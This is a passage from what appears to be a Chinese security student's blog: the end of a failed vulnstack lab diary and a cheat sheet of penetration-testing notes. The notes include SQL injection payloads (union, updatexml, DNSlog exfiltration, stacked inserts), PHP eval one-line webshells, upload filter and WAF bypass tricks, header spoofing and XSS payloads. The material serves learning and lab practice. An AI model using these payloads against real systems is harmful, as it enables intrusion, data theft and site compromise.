class="hljs-built_in">bind</span>)<br>run<br></code></pre></td></tr></table></figure><p>失败…换个靶机…失败…换个漏洞…还是失败…<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122046969.png" alt="image-20231203122046969"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122212018.png" alt="image-20231203122212018"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122249273.png" alt="image-20231203122249273"></p></li><li><p>各种方法都不行，别人一打一个准，我一打一个不吱声。<del>不学了呜呜呜</del></p></li></ol><h5 id="检查失败原因"><a href="#检查失败原因" class="headerlink" title="检查失败原因"></a>检查失败原因</h5><p>漏洞探测模块是没问题的，能通过路由发现存在漏洞，攻击的时候出了问题，探测不到开放的端口，利用msf的代理模块加个 <code>proxychains</code> nmap试试<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203124202191.png" alt="image-20231203124202191"></p><p>嘶，这代理就没用，再次尝试cs的代理，也没用…</p><h5 id="内网收集4-nps"><a href="#内网收集4-nps" class="headerlink" title="内网收集4 - nps"></a>内网收集4 - nps</h5><p>没办法了，在靶机传一个npc，利用我们以前搭建在阿里云上的nps进行一下代理服务。</p><p>破防了哥，还是没用，代理是挂上去了，但是用的时候出问题，想不明白<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203150644924.png" alt="image-20231203150644924"></p><h5 id="放弃？"><a href="#放弃？" class="headerlink" title="放弃？"></a>放弃？</h5><p>思考不出来，搜不到，放弃了吗？nonono 还有一招，问！</p><p>把遇到的问题简化一下拿去问问 xlc <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203151835605.png" alt="image-20231203151835605"></p><p>好了，现在大家都知道我是拿nmap挂代理的憨批了，代理不稳定确实是比较重要的原因，因为是内网就下意识忽略了网络原因，回到内网收集2&#x2F;3，经过我反复的测试，终于确定，走不通。。。</p><h5 id="魔幻世界"><a href="#魔幻世界" class="headerlink" title="魔幻世界"></a>魔幻世界</h5><p>最后在xlc的指导下搞了几个小时，实在没办法了，直接把靶机放在kali的网卡下尝试漏扫，好家伙直接没洞了，xlc说我环境日坏了，我去重新下了2003靶机，还是扫不出来，换热点就又行了？？(万恶的校园网) 但是换热点也只是能扫到洞，还是利用不了，未果，寻病终…</p><h4 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h4><p><a href="https://github.com/guchangan1/All-Defense-Tool">guchangan1&#x2F;All-Defense-Tool: 全网优秀攻防武器工具项目搜集</a></p><p><a href="https://github.com/TryGOTry/CobaltStrike_Cat_4.5">TryGOTry&#x2F;CobaltStrike_Cat_4.5: 猫猫Cs:基于Cobalt Strike_4.5二开 (原dogcs二开移植) (github.com)</a></p><p><a href="https://github.com/k8gege/Ladon">k8gege&#x2F;Ladon: Ladon大型内网渗透工具</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>学习</tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网安学习笔记(持续更新中)</title>
    <link href="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <url>/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><h3 id="允许测试的网页"><a href="#允许测试的网页" class="headerlink" title="允许测试的网页"></a>允许测试的网页</h3><ul><li><a href="http://testfire.net/">http://testfire.net/</a></li><li>vulnweb.com</li></ul><h3 id="工具收集信息"><a href="#工具收集信息" class="headerlink" title="工具收集信息"></a>工具收集信息</h3><ul><li>水泽(<strong>kali</strong>::  python3.7 shuize.py -d domain)</li><li>灯塔(<strong>tencent</strong>::  docker-compose启动后在5003端口访问)</li></ul><h3 id="app-web"><a href="#app-web" class="headerlink" title="app-&gt;web"></a>app-&gt;web</h3><ul><li>反编译(漏了个大洞)</li><li>抓包(burp)</li></ul><h3 id="CDN检查-绕过"><a href="#CDN检查-绕过" class="headerlink" title="CDN检查&#x2F;绕过"></a>CDN检查&#x2F;绕过</h3><ul><li>超级ping</li><li><a href="http://ping.chinaz.com/">站长之家</a></li><li><a href="http://ping.aizhan.com/">爱站网</a></li><li><a href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></li><li><a href="https://www.17ce.com/">https://www.17ce.com/</a></li><li>子域名查询</li><li>邮件服务</li><li>国外地址 如<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li><li>遗留文件查询 如PHPinfo</li><li>fuckcdn w8fuckcdn zmap</li></ul><h3 id="waf检查"><a href="#waf检查" class="headerlink" title="waf检查"></a>waf检查</h3><ul><li>wafwoof</li><li><a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></li><li>rebots.txt</li><li>网页源码检查</li></ul><h3 id="cms建站平台识别"><a href="#cms建站平台识别" class="headerlink" title="cms建站平台识别"></a>cms建站平台识别</h3><ul><li><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li><li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li></ul><h3 id="ip发现"><a href="#ip发现" class="headerlink" title="ip发现"></a>ip发现</h3><ul><li>kali 上的 netdiscover</li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>Nmaps -sV</li><li>黑暗引擎</li></ul><h3 id="网站-服务器信息搜索"><a href="#网站-服务器信息搜索" class="headerlink" title="网站&#x2F;服务器信息搜索"></a>网站&#x2F;服务器信息搜索</h3><ul><li>bing&#x2F;google&#x2F;baidu</li><li>shodan</li><li>zoomeye</li><li>fofa</li></ul><h3 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h3><ul><li>teemo(python)</li><li>layer(exe)</li><li>证书查询(子域名公用)</li><li><a href="https://crt.sh/">crt.sh | Certificate Search</a></li></ul><h3 id="同ip、旁注、C段"><a href="#同ip、旁注、C段" class="headerlink" title="同ip、旁注、C段"></a>同ip、旁注、C段</h3><ul><li><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li></ul><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul><li>御剑</li><li>dirsearch -u url(s)</li><li>dirb(kali)</li></ul><h3 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h3><ul><li><p>ffuf(kali)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>burp-parameter-names.txt:PARAM -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.141</span>/secret?PARAM=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议<a id="PHP伪协议"></a></h3><p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTF中常用的php伪协议利用 - 1ndex- - 博客园</a></p><p><a href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园</a></p><h3 id="windows镜像站"><a href="#windows镜像站" class="headerlink" title="windows镜像站"></a>windows镜像站</h3><ul><li><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></li></ul><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul><li><p><a href="https://gtfobins.github.io/">linux各命令如何提权</a></p></li><li><p><a href="https://github.com/carlospolop/PEASS-ng">自动提权检测项目</a></p></li><li><p><a href="https://www.cnblogs.com/xiaozi/p/12600258.html">提权辅助工具箱 - Bypass - 博客园</a></p></li><li><p><a href="https://blog.csdn.net/qq_37407863/article/details/125574878#:~:text=%E8%BF%90%E7%BB%B4%E4%BA%BA%E5%91%98%E5%A6%82%E6%9E%9C%E5%9C%A8%E6%9C%8D,%E6%8F%90%E5%8D%87%E5%88%B0root%E3%80%82">SSH密钥提权_ssh提权</a></p></li><li><pre><code class="hljs">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br>  <br><br>### 反弹<span class="hljs-keyword">shell</span><br><br>- [反弹<span class="hljs-keyword">shell</span>原理和常见反弹<span class="hljs-keyword">shell</span>方式 - 知乎 (zhihu.<span class="hljs-keyword">com</span>)](https://zhuanlan.zhihu.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">p</span>/<span class="hljs-number">446210083</span>)<br><br>- <span class="hljs-keyword">python</span>拿<span class="hljs-keyword">shell</span><br><br>  ```<span class="hljs-keyword">python</span><br>  <span class="hljs-keyword">python</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="做题遇到的小知识点"><a href="#做题遇到的小知识点" class="headerlink" title="做题遇到的小知识点"></a>做题遇到的小知识点</h3><ul><li><p>jsfuck(直接丢控制台跑)<img src="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20230515091345012.png" alt="image-20230515091345012"></p></li><li><p>环境变量看一看 陌生链接点一点</p><h5 id="http头"><a href="#http头" class="headerlink" title="http头"></a>http头</h5><ul><li>代理 via</li><li>伪造ip xff client-ip  X-REAL-IP</li></ul></li><li><p><a href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTF必备密码编码大全</a></p></li><li><p>php文件上传漏洞遇到后缀限制 不仅可以通过.htaccess 也可以通过上传.user.ini文件声明一个文件包含[<a href="https://blog.csdn.net/RABCDXB/article/details/113623796">SUCTF 2019]CheckIn_</a></p></li><li><p>md5解密: md5 somd5</p></li><li><p>遇到linux靶机直接搭载本地的情况，开机后按shift，选用户界面按e，修改ro为rw single init&#x3D;&#x2F;bin&#x2F;bash 按ctrl+x进入root用户命令行</p></li><li><p>brainfuck(一键解码能解)</p></li><li><p>linux系统开放139 445端口并伴有smb服务，可利用enum4linux扫描信息</p></li><li><p><a href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">FilterChain攻击解析及利用</a></p></li><li><p><a href="https://www.anquanke.com/post/id/241148#h3-7">Proc 目录在 CTF 中的利用</a></p></li><li><p>图片隐写工具(kali)Steghide  隐写密码爆破stegseek</p></li><li><p>反弹shell后远程下载(scp), 或者</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">靶机<br>python3 -m http.server [port]<br><br>kali<br>wget <span class="hljs-link">http://</span>[<span class="hljs-string">靶机ip</span>]:[port]/文件名<br></code></pre></td></tr></table></figure></li><li><p>当返回值与页面内容不符时，可能是静态网页</p></li><li><p>拿到shell后先看history</p></li><li><p>扫目录时，如果目录不可直接查看，可以在字典后加一个.php或其他后缀再扫文件，比如</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.141/secret</span> -X <span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure></li><li><p>目录扫不出再去看js等有无泄露信息，不行就下载源码自己找敏感文件(数据库配置之类的)</p></li><li><p>全网历史版本查看 <a href="http://archive.org/web/web.php">Wayback Machine</a></p></li><li><p>拿到ssh私钥但是登陆不上，可以用工具从私钥中爆破出密码</p></li><li><p>参数中包含<code>_</code>时可用非法字符<code>[</code>进行替换</p></li><li><p>php参数传递数组<code>?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!!</code></p></li><li><p>php内嵌文本段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span> = <span class="hljs-string">&lt;&lt;&lt;&#x27;CODE_NAME&#x27;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &#x27;Hello PHP&#x27;;</span><br><span class="hljs-string">CODE_NAME</span>;<br></code></pre></td></tr></table></figure></li></ul><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="⭐mysql-（php注入）"><a href="#⭐mysql-（php注入）" class="headerlink" title="⭐mysql （php注入）"></a>⭐mysql （php注入）</h4><ul><li><p>判断注入点</p></li><li><p>order by 猜测列名数量</p></li><li><h5 id="报错猜解准备"><a href="#报错猜解准备" class="headerlink" title="报错猜解准备"></a>报错猜解准备</h5><ul><li>数据库版本：version()</li><li>数据库名字：database()</li><li>数据库用户：user()</li><li>操作系统：@@version_compile_os</li></ul></li><li><p>低版本 暴力破解</p></li><li><p>高版本 information_schema数据库里存放有所有数据库名、表名、列名。</p></li><li><p>表名  ?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D; <code>数据库名</code></p></li><li><p>列名   ?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;<code>表名</code></p></li><li><p>数据   ?id&#x3D;-1 union select 1,name,password,4 from <code>表名</code></p></li><li></li><li><p>注入-&gt;文件写入 文件读取(数据库语法)</p></li><li><p>魔术引号-&gt;16进制编码 宽字节</p></li></ul><h3 id="参数提交注入"><a href="#参数提交注入" class="headerlink" title="参数提交注入"></a>参数提交注入</h3><h4 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h4><ul><li>数字 字符 搜索 json</li></ul><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><ul><li>get post cookie request http头</li></ul><h3 id="各种数据库注入及注入工具使用"><a href="#各种数据库注入及注入工具使用" class="headerlink" title="各种数据库注入及注入工具使用"></a>各种数据库注入及注入工具使用</h3><h4 id="access注入-asp注入"><a href="#access注入-asp注入" class="headerlink" title="access注入(asp注入)"></a>access注入(asp注入)</h4><ul><li><p>不区分数据库 也无高级功能</p></li><li><p>库文件直接存放于网站目录下(可爆库)</p></li><li><p>联合查询 逐字猜解 使用工具(推荐)</p></li><li><p>union注入  http header注入  偏移注入等</p></li><li><h5 id="补充-表名列名猜解不到"><a href="#补充-表名列名猜解不到" class="headerlink" title="补充(表名列名猜解不到)"></a>补充(表名列名猜解不到)</h5><ul><li>列名 偏移注入</li><li>表名 源码命名方式猜解</li></ul></li></ul><h4 id="msSQL-sever注入"><a href="#msSQL-sever注入" class="headerlink" title="msSQL sever注入"></a>msSQL sever注入</h4><ul><li>获取数据 文件读写 执行sql语句</li><li>cmd命令 远程交互 注册表操作</li><li><a href="https://www.cnblogs.com/xishaonian/p/6173644.html">MSSQL注入 - 珍惜少年时 - 博客园 (cnblogs.com)</a></li></ul><h4 id="PostGresql注入"><a href="#PostGresql注入" class="headerlink" title="PostGresql注入"></a>PostGresql注入</h4><ul><li><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">PostGresql 注入知识汇总 - 一粒砂子 - 博客园 (cnblogs.com)</a></li></ul><h4 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h4><ul><li><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结 - Carrypan - 博客园 (cnblogs.com)</a></li></ul><h4 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h4><ul><li><a href="https://www.cnblogs.com/wefeng/p/11503102.html">Python操作MongoDB文档数据库 - wefeng - 博客园 (cnblogs.com)</a></li><li>sqlmap无法识别 需要用nosqlattack</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>sqlmap -u url –v 3 [–data&#x3D;”id&#x3D;1”]  <a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap</a></li><li>nosqlattack  <a href="https://github.com/youngyangyang04/NoSQLAttack">github-nosqlattack</a></li></ul><h3 id="查询方式-盲注"><a href="#查询方式-盲注" class="headerlink" title="查询方式 盲注"></a>查询方式 盲注</h3><h4 id="SQL查询语句"><a href="#SQL查询语句" class="headerlink" title="SQL查询语句"></a>SQL查询语句</h4><ul><li><p>select * from news where id&#x3D;$id</p></li><li><p>insert into news (id, url,text) values ( 2，’x’,’$t’)</p></li><li><p>delete from news where id&#x3D;$id</p></li><li><p>update user set pwd&#x3D;’$p’ where id&#x3D;2 and username&#x3D;’ admin’</p></li><li><p>select * from news order by $id</p></li><li><p>select id , name , price from news order by $order</p></li></ul><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><a href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a></p><p>1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid<br>2、基于时间的sQL盲注-延时判断 if ,sleep<br>3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue </p><ul><li><p>首先了解下updatexml()函数1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">`UPDATEXML (XML_document, XPath_string, new_value);`<br><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br><br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br><br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br><br>作用：改变文档中符合条件的节点的值<br><br>改变XML_document中符合XPATH_string的值<br><br>而我们的注入语句为：<br><br>`updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)`<br><br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 `@<span class="hljs-variable">@version</span>`<br></code></pre></td></tr></table></figure></li></ul><h3 id="特殊注入"><a href="#特殊注入" class="headerlink" title="特殊注入"></a>特殊注入</h3><h4 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h4><ul><li>参数base64编码后传入 (可能伴有url编码 如’’%3D’→’&#x3D;’)</li><li>将注入语句编码后传入参数</li></ul><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>注入的语句中 特殊符号被魔术引号转义后储存在数据库  当其他地方通过查询得到该数据并用于数据库操作时 触发注入</p><ul><li>白盒审计</li><li>常见于注册</li><li>较难发现 不实用</li></ul><h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><ul><li>ceye.io</li><li>id&#x3D;1’ and if((select load_file(concat(‘\\‘, (select version()), ‘.[自己的标号].ceye.co\abc’))),1,0)–+</li><li><a href="https://github.com/ADOOO/DnslogSqlinj">ADOOO&#x2F;DnslogSqlinj (github.com)</a></li></ul><h4 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h4><ul><li>写一个中转网页实现参数接收 加密 拼接并发送请求 且监听返回值 用注入工具对此网页进行测试</li></ul><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><ul><li>id&#x3D;1 ‘;insert into users(id,username,password) values ( 39, ‘less38 ‘, ‘hello ‘)–+</li></ul><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><h4 id="干扰匹配规则"><a href="#干扰匹配规则" class="headerlink" title="干扰匹配规则"></a>干扰匹配规则<a id="disturb"></a></h4><ul><li><pre><code class="mysql">%20union%20all%23%0a%20select%201,2,3%23 union all #  select 1,2,3#<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  <br><br><span class="hljs-comment">#### http参数污染</span><br><br>- 不同的后端代码针对多个参数有不同的取用规则<br><br>- ```mysql<br>  ?<span class="hljs-built_in">id</span>=1/**&amp;<span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,2,3<span class="hljs-comment">#*/</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><ul><li><pre><code class="mysql">/** ! */  配合参数污染使用↑<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>#### fuzz(脚本跑字典)<br><br>- [fuzz](D:\骚工具\fuzzdb-master)<br>- https:<span class="hljs-comment">//github.com/gh0stkey/Web-Fuzzing-Box/tree/main</span><br><br>#### ip白名单(修改http头)<br><br>- x-forwarded-for<br>- x-remote-IP<br>- x-originating-IP<br>- x-remote-addr<br>- X-<span class="hljs-built_in">Real</span>-ip<br><br>#### 静态资源<br><br>- index.php/x.txt?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br>#### url白名单<br><br>#### 爬虫白名单<br><br>- 伪装搜索引擎的收录爬虫<br><br>- 用于防止扫描工具误报及访问频率过高被拦截<br><br>- ```<br>  Mozilla/<span class="hljs-number">5.0</span> (compatible; Baiduspider/<span class="hljs-number">2.0</span>; +http:<span class="hljs-comment">//www.baidu.com/search/spider.html)</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="mysql版本号绕过"><a href="#mysql版本号绕过" class="headerlink" title="mysql版本号绕过"></a>mysql版本号绕过</h4><ul><li>&#x2F;*!50001 select 1,2,3 *&#x2F;  (版本号大于5.0.1执行)</li></ul><h4 id="sqlmap绕过waf"><a href="#sqlmap绕过waf" class="headerlink" title="sqlmap绕过waf"></a>sqlmap绕过waf</h4><ul><li><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">sqlmap的使用 —- 自带绕过脚本tamper</a></p></li><li><p>自行编写脚本  <a href="#disturb">干扰匹配规则</a></p></li><li><p>结合爬虫白名单 <code>--user-agent=&quot;&quot;</code></p></li></ul><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;<br>&lt;script language=&#x27;php&#x27;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><ul><li><p>下载源码到本地并删除js判断脚本</p></li><li><p>抓包改文件名</p></li></ul><h4 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h4><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><ul><li>后缀用其他格式替换 如php5 php3</li><li>apache服务器 .htaccess 文件更改执行规则</li><li>大小写 尾部空格符 点绕过 ::$DATA绕过 pphphp</li><li>第三步多次使用 绕 一次过滤</li></ul><h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><ul><li>MIME信息验证 _FILES[‘upload_file’] [‘type’] &#x3D;&#x3D; ‘image&#x2F;png’</li><li>0x00 %00 截断文件名(建立在地址)</li><li>如果php文件上传处白名单 且存在文件读取函数 如 <code>file_get_comments</code> 且 本地开放的有其他服务(比如redis)，可以利用Phar反序列化 原生类<code>SoupClient</code> 发一个post数据包 且利用CRLF实现任意数据包构造  从而打ssrf</li></ul><h5 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h5><ul><li>图片插入脚本 配合文件包含漏洞</li><li>二次渲染 条件竞争 重复上传同时访问 尝试中断删除操作</li><li>伪造文件夹-&gt;文件上传  &#x2F;upload&#x2F;webshell.php&#x2F;.</li></ul><h5 id="中间件漏洞-搭建平台"><a href="#中间件漏洞-搭建平台" class="headerlink" title="中间件漏洞(搭建平台)"></a>中间件漏洞(搭建平台)</h5><p>​<a href="https://www.freebuf.com/articles/web/192063.html">Web中间件常见漏洞总结</a></p><ul><li>tomcat  CVE2017-12615</li><li>apache  低版本解析漏洞</li><li>nginx解析漏洞 (无需脚本格式 正常上传 &#x2F;kobe.png&#x2F;0.php)</li></ul><h5 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h5><p>​fuckeditor ckeditor ueditor kindeditor…</p><h4 id="waf绕过-1"><a href="#waf绕过-1" class="headerlink" title="waf绕过"></a>waf绕过<a id="upload_waf"></a></h4><h5 id="参数名"><a href="#参数名" class="headerlink" title="参数名"></a>参数名</h5><ul><li>Content-Disposition:一般可更改</li><li>name:表单参数值，不能更改</li><li>filename :文件名，可以更改</li><li>Content-Type:文件MIME，视情况更改</li></ul><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><ul><li>数据溢出</li><li>符号变异 <code>&#39; &quot; ;</code></li><li>数据截断 <code>%00</code> <code>;</code> <code>换行</code></li><li>重复数据</li><li><a href="D:\骚工具\fuzzdb-master">fuzz</a></li></ul><h3 id="XSS跨站漏洞"><a href="#XSS跨站漏洞" class="headerlink" title="XSS跨站漏洞"></a>XSS跨站漏洞</h3><ul><li>分类 反射型、存储型、DOM型</li><li>常见手法 <a href="https://xss.yt/">平台</a>、工具、代码分析</li><li>⚠也可能为ssti 注意识别</li></ul><h5 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h5><ul><li>beef kali虚拟机装配 </li><li><a href="D:\骚工具\Postman\Postman.exe">postman</a> 改头发送数据包</li><li>burp配合fuzz字典</li><li>xssstrike.py</li></ul><h5 id="httponly绕过-利用平台"><a href="#httponly绕过-利用平台" class="headerlink" title="httponly绕过(利用平台)"></a>httponly绕过(利用平台)</h5><ul><li>表单劫持</li><li>读取浏览器保存信息</li></ul><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li><li><p>闭合标签 插入a标签 使用内置函数(onclick) 大小写防匹配 双写 编码 注释干扰字符</p></li></ul><h5 id="waf绕过-2"><a href="#waf绕过-2" class="headerlink" title="waf绕过"></a>waf绕过<a id="xss_bypass"></a></h5><ul><li>确定是不是ssti</li><li>去除右括号 并对链接加’’ <code>&lt;script src=&#39;a.com/sdfs&#39;</code></li><li>特殊符号干扰 <code>&lt;script src=&#39;a.com/sdfs&#39;#&gt; </code></li><li>标签更换 <code>&lt;a /href=&quot;a.com/sdfs&quot;#&gt;a</code> <code>&lt;img src=&#39;&#39; onerrer=&#39;a.com/sdfs&#39;&gt;</code> </li><li>三重url编码绕过符号编码</li><li>更换提交方式  unicode编码</li><li>fuzz [网站][<a href="http://www.xssfuzzer.com/fuzzer.html]">www.xssfuzzer.com/fuzzer.html]</a></li></ul><h5 id="安全修复"><a href="#安全修复" class="headerlink" 